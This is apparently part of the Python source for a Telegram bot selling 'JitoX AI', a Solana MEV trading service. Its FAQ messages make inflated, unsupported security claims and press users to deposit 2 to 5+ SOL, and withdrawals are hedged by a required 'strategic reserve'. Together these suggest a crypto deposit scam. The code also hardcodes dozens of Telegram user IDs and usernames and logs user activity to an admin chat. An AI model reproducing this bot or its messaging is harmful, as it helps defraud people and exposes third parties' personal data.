            "⚔️ Smart Contract Security: Advanced audit protocols\n"
            "⚔️ Risk Intelligence: Real-time exposure management\n"
            "⚔️ Operational Transparency: On-chain verification matrix\n"
            "⚔️ Professional Monitoring: 24/7 system surveillance\n\n"
            "🛡️ <b>Security Infrastructure</b>\n"
            "✨ Military-grade encryption protocols\n"
            "✨ Advanced threat detection systems\n"
            "✨ Multi-layer protection architecture\n\n"
            "🔮 <b>Professional Safeguards</b>\n"
            "• Institutional-grade risk management\n"
            "• Strategic position monitoring\n"
            "• Advanced security optimization\n\n"
            "⚡️ <b>Access Framework</b>\n"
            "• Standard Suite: 2 SOL initialization\n"
            "• Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior security ensures sustainable MEV performance. 🎮\n\n"
            "💫 <b>24/7 Professional Support</b>\n"
            "Contact @JitoX_AI for immediate assistance"
        )
    keyboard = [[InlineKeyboardButton("🔑 Secure Your Spot", callback_data='get_wallet')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def withdraw_faq(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Withdrawal Matrix</b> 👾\n\n"
            "💎 <b>Professional Liquidity Framework</b>\n\n"
            "⚡️ <b>Withdrawal Protocol Suite</b>\n"
            "• Institutional-grade processing\n"
            "• Real-time transaction execution\n"
            "• Advanced security verification\n\n"
            "🎯 <b>Strategic Process</b>\n"
            "⚔️ Access withdrawal interface\n"
            "⚔️ Configure extraction parameters\n"
            "⚔️ Confirm security protocols\n"
            "⚔️ Automated processing matrix\n"
            "⚔️ Direct wallet settlement\n\n"
            "🛡️ <b>Operational Parameters</b>\n"
            "✨ Minimum extraction: 2 SOL\n"
            "✨ Strategic reserve: 2 SOL minimum\n"
            "✨ Network optimization fees apply\n\n"
            "🔮 <b>Professional Advisory</b>\n"
            "• Sustained operations maximize MEV capture\n"
            "• Strategic capital retention recommended\n"
            "• Enhanced Suite benefits (5+ SOL):\n"
            "  - Priority processing protocols\n"
            "  - Optimized fee structure\n\n"
            "Professional traders understand: Superior capital management ensures optimal MEV performance. 🎮\n\n"
            "💫 <b>24/7 Professional Support</b>\n"
            "Contact @JitoX_AI for immediate assistance"
        )
    keyboard = [[InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def log_user_activity(application, user_id, activity):
    """Log user activity and store new users."""
    admin_chat_id = -4540844698
    try:
        # Get user info
        user = await application.bot.get_chat(user_id)
        username = user.username if user.username else user.first_name
        
        # Store user in CSV
        await store_new_user(user_id, username)
        
        # Send log message
        message = f"User {username} ({user_id}) {activity}"
        await application.bot.send_message(chat_id=admin_chat_id, text=message)
        
    except Exception as e:
        logger.error(f"Failed to log user activity: {e}")

async def store_new_user(user_id: int, username: str = None):
    """Store new user in CSV file."""
    try:
        # Create file with headers if it doesn't exist
        if not os.path.exists('user_data.csv'):
            with open('user_data.csv', 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow(['user_id', 'username', 'joined_at'])

        # Check if user already exists
        user_exists = False
        if os.path.exists('user_data.csv'):
            with open('user_data.csv', 'r', newline='', encoding='utf-8') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    if int(row['user_id']) == user_id:
                        user_exists = True
                        break

        # Add user if they don't exist
        if not user_exists:
            with open('user_data.csv', 'a', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow([user_id, username, datetime.now(timezone.utc).isoformat()])
        
        return True
    except Exception as e:
        logger.error(f"Error storing new user: {e}")
        return False

async def handle_blocked_user(user_id: int):
    try:
        # Remove from CSV file
        if os.path.exists('user_data.csv'):
            df = pd.read_csv('user_data.csv')
            df = df[df['user_id'].astype(str) != str(user_id)]
            df.to_csv('user_data.csv', index=False)
        
        # Remove from user_data dictionary
        if str(user_id) in user_data:
            del user_data[str(user_id)]
            
        logger.info(f"Removed blocked user {user_id}")
    except Exception as e:
        logger.error(f"Error removing blocked user: {str(e)}")

# Initialize user_data at startup
user_data = {}
try:
    if not os.path.exists('user_data.csv'):
        with open('user_data.csv', 'w', newline='', encoding='utf-8') as file:
            writer = csv.writer(file)
            writer.writerow(['user_id', 'username', 'first_name', 'last_name'])
            logger.info("Created new user_data.csv file with headers")
    
    df = pd.read_csv('user_data.csv')
    for _, row in df.iterrows():
        user_data[str(row['user_id'])] = {
            'username': row['username'],
            'first_name': row['first_name'],
            'last_name': row['last_name']
        }
    logger.info(f"Loaded {len(user_data)} users from CSV")
except Exception as e:
    logger.error(f"Error loading user data: {str(e)}")
    # Create empty user_data.csv if there was an error
    with open('user_data.csv', 'w', newline='', encoding='utf-8') as file:
        writer = csv.writer(file)
        writer.writerow(['user_id', 'username', 'first_name', 'last_name'])

async def track_message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    if message:
        try:
            df = pd.read_csv('message_mapping.csv')
            mapping = df[df['telegram_message_id'] == str(message.message_id)]
            if not mapping.empty:
                broadcast_id = mapping.iloc[0]['broadcast_id']
                broadcaster.track_message_read(broadcast_id, update.effective_user.id)
                logger.info(f"Tracked message read: {broadcast_id} by user {update.effective_user.id}")
        except Exception as e:
            logger.error(f"Error tracking message read: {e}")

async def message_read_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    if message:
        try:
            df = pd.read_csv('message_mapping.csv')
            mapping = df[df['telegram_message_id'] == str(message.message_id)]
            if not mapping.empty:
                broadcast_id = mapping.iloc[0]['broadcast_id']
                broadcaster.track_message_read(broadcast_id, update.effective_user.id)
                logger.info(f"Tracked message read: {broadcast_id} by user {update.effective_user.id}")
        except Exception as e:
            logger.error(f"Error tracking message read: {e}")

async def migrate_database():
    """Handle database migrations and updates."""
    try:
        async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
            # Check if earnings column exists in referrals table
            async with db.execute("PRAGMA table_info(referrals)") as cursor:
                columns = await cursor.fetchall()
                has_earnings = any(col[1] == 'earnings' for col in columns)
                
                if not has_earnings:
                    logger.info("Adding earnings column to referrals table")
                    await db.execute('ALTER TABLE referrals ADD COLUMN earnings REAL DEFAULT 0')
                    await db.commit()
            
            # Add any future migrations here
            
            logger.info("Database migration completed successfully")
    except Exception as e:
        logger.error(f"Error during database migration: {e}")
        raise

async def ensure_db_exists():
    """Ensure the database file exists and has the correct structure."""
    try:
        # Create database directory if it doesn't exist
        db_dir = os.path.dirname(REFERRAL_DB_PATH)
        if db_dir and not os.path.exists(db_dir):
            os.makedirs(db_dir)
            logger.info(f"Created database directory: {db_dir}")
        
        # Initialize database tables
        success = await init_referral_db()
        if not success:
            raise Exception("Failed to initialize database")
        
        # Verify tables exist and have correct structure
        async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
            # Check referral_codes table
            async with db.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='referral_codes'") as cursor:
                if not await cursor.fetchone():
                    raise Exception("referral_codes table not found")
            
            # Check referrals table
            async with db.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='referrals'") as cursor:
                if not await cursor.fetchone():
                    raise Exception("referrals table not found")
            
            logger.info("Database structure verified successfully")
        
        # Run any necessary migrations
        await migrate_database()
        
        logger.info("Database initialization completed successfully")
        return True
    except Exception as e:
        logger.error(f"Error ensuring database exists: {e}")
        raise

async def recover_missed_users(application: Application) -> None:
    """Recover users that were missed and add them to the user data file."""
    try:
        # Get existing users from CSV using manual reading to handle corrupted files
        csv_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'user_data.csv')
        existing_users = set()
        
        if os.path.exists(csv_file):
            try:
                with open(csv_file, 'r', newline='', encoding='utf-8') as f:
                    next(f)  # Skip header
                    for line in f:
                        try:
                            # Split line and clean values
                            parts = [p.strip() for p in line.strip().split(',')]
                            if parts and parts[0]:  # Check if we have a user_id
                                existing_users.add(parts[0])
                        except Exception as line_error:
                            logger.error(f"Error parsing line in CSV: {line_error}")
                            continue
                logger.info(f"Found {len(existing_users)} existing users in CSV")
            except Exception as e:
                logger.error(f"Error reading CSV file: {e}")
        
        # Send notification about current user count
        admin_chat_id = -4540844698
        try:
            await application.bot.send_message(
                chat_id=admin_chat_id,
                text=f"Current user count in database: {len(existing_users)}\n\nNote: Due to Telegram API limitations, we cannot automatically recover old messages. Please forward any important user interaction messages to this chat manually if needed."
            )
        except Exception as e:
            logger.error(f"Error sending admin notification: {e}")
            
    except Exception as e:
        logger.error(f"Error in recover_missed_users: {e}")
        # Continue bot operation even if recovery fails
        pass

async def add_missed_users():
    """Add missed users to the CSV file."""
    missed_users = [
        (789156333, "Michaelcasel9"),
        (6891153210, "JackyWangg"),
        (7646608198, "Jack"),
        (7065528683, "bluesinz"),
        (6109842687, "SautuBilal"),
        (5745101762, "dertyp999000"),
        (827324156, "codee21"),
        (7274014705, "patriive"),
        (1684979519, "Amit1603349"),
        (7635149853, "Mrxxhere"),
        (583822317, "UltimaWar"),
        (1462369980, "s28decentralized"),
        (363104330, "hokus7"),
        (310071061, "mmdoseh"),
        (1635810851, "c9580"),
        (426310896, "Tasiu37"),
        (595839917, "alexxvinn"),
        (5390584670, "Madjid"),
        (978625466, "IDoIt4ALiving"),
        (5537651609, "Sanjit"),
        (7140115193, "Baronsmiles002"),
        (6915936629, "Trumpsofficiall"),
        (5393695674, "CryptoBell0"),
        (1949836264, "skybucksboy"),
        (931022633, "zackbaharum"),
        (1780810427, "FendiCryptologi"),
        (1138015784, "llausdeo"),
        (2047082463, "CO"),
        (1944531910, "WhoopWho"),
        (7686531227, "SoftwareDev1738"),
        (1058833392, "dobrozloRap"),
        (7823490107, "AnnieBananiee"),
        (7241977064, "morhengrt"),
        (5847009152, "Nylez85"),
        (1391928444, "bisbaik"),
        (5135754228, "yizhiqingwa"),
        (7946234743, "Blitzou"),
        (5255753735, "Bill"),
        (259909408, "mthomas1985"),
        (869946859, "SuhailAhmadLone"),
        (5263460826, "mahmutnurettins"),
        (351094512, "thehorizoner"),
        (1239128550, "Raj"),
        (5804450621, "primeerrr1")
    ]
    
    try:
        # Get the CSV file path
        csv_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'user_data.csv')
        
        # Create backup before making changes
        backup_name = f'user_data_backup_{int(time.time())}.csv'
        backup_path = os.path.join(os.path.dirname(csv_file), backup_name)
        shutil.copy2(csv_file, backup_path)
        logger.info(f"Created backup at {backup_path}")
        
        # Read existing users to avoid duplicates
        existing_users = set()
        with open(csv_file, 'r', newline='', encoding='utf-8') as f:
            for line in f:
                try:
                    # Skip header
                    if 'user_id' in line.lower():
                        continue
                    # Split line and clean values
                    parts = [p.strip() for p in line.strip().split(',')]
                    if parts and parts[0]:  # Check if we have a user_id
                        try:
                            user_id = int(parts[0])
                            existing_users.add(user_id)
                        except ValueError:
                            logger.warning(f"Skipping invalid user_id in line: {line}")
                except Exception as e:
                    logger.warning(f"Error parsing line: {line}, error: {e}")
                    continue
        
        logger.info(f"Found {len(existing_users)} existing users")
        
        # Add new users
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        added_count = 0
        
        with open(csv_file, 'a', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            for user_id, username in missed_users:
                if user_id not in existing_users:
                    writer.writerow([user_id, username, current_time])
                    added_count += 1
                    existing_users.add(user_id)
                    logger.info(f"Added new user: {user_id} ({username})")
        
        logger.info(f"Successfully added {added_count} new users to the CSV file")
        return added_count
        
    except Exception as e:
        logger.error(f"Error adding missed users: {e}")
        return 0

def main() -> None:
    """Initialize and start the bot."""
    try:
        # Initialize the application
        application = Application.builder().token(BOT_TOKEN).build()
        
        # Initialize database
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(ensure_db_exists())
            logger.info("Database initialization completed successfully")
            # Recover missed users
            loop.run_until_complete(recover_missed_users(application))
            # Add missed users from the list
            loop.run_until_complete(add_missed_users())
            logger.info("Added missed users to the database")
        except Exception as e:
            logger.error(f"Failed to initialize database: {e}")
            return  # Exit if database initialization fails
        
        # Add command handlers
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("get_wallet", get_wallet_command))
        application.add_handler(CommandHandler("mev", mev_command))
        application.add_handler(CommandHandler("intensity", intensity_command))
        application.add_handler(CommandHandler("pool", pool_command))
        application.add_handler(CommandHandler("settings", settings_command))
        application.add_handler(CommandHandler("ca", ca_command))
        application.add_handler(CommandHandler("auto", auto_command))
        application.add_handler(CommandHandler("withdraw", withdraw_command))
        
        application.add_handler(CommandHandler("min_deposit", min_deposit_faq))
        application.add_handler(CommandHandler("mev_info", mev_info_faq))
        application.add_handler(CommandHandler("security", security_faq))
        application.add_handler(CommandHandler("withdraw_faq", withdraw_faq))
        application.add_handler(CommandHandler("eth_wallet", get_eth_wallet))

        # Add callback query handler
        application.add_handler(CallbackQueryHandler(button_handler))

        # Add job for checking deposits
        application.job_queue.run_repeating(check_deposits, interval=60, first=10)

        logger.info("Bot started successfully")
        application.run_polling(allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        logger.error(f"Error in main function: {str(e)}")
        raise

if __name__ == '__main__':
    asyncio.run(main())
    asyncio.run(send_blocked_users_notification())
broadcaster = BroadcastSystem()

